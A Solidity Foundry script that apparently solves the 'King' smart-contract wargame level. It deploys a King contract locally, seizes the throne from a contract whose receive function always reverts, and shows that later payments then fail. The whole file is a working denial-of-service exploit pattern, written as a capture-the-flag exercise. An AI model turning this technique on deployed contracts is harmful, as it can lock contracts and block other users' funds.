// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "forge-std/Script.sol";
import "../src/King.sol";

contract KingHack is Script {
    King public king;

    function run() public {
        address eoa = address(1024);
        vm.deal(eoa, 5 ether);
        vm.startPrank(eoa);
        king = new King{value: 0.01 ether}();
        vm.stopPrank();

        vm.deal(address(this), 5 ether);

        console.log("Before: ", king._king());
        (bool success, ) = payable(address(king)).call{value: 1 ether}("");
        console.log("Attack status: %s, After: %s", success, king._king());

        // simulate another normal transaction after attack
        vm.startPrank(eoa);
        (success, ) = payable(address(king)).call{value: 2 ether}("");
        vm.stopPrank();
        require(success == false);
        console.log(king._king());
    }

    receive() external payable {
        require(false, "I'm the King");
    }
}
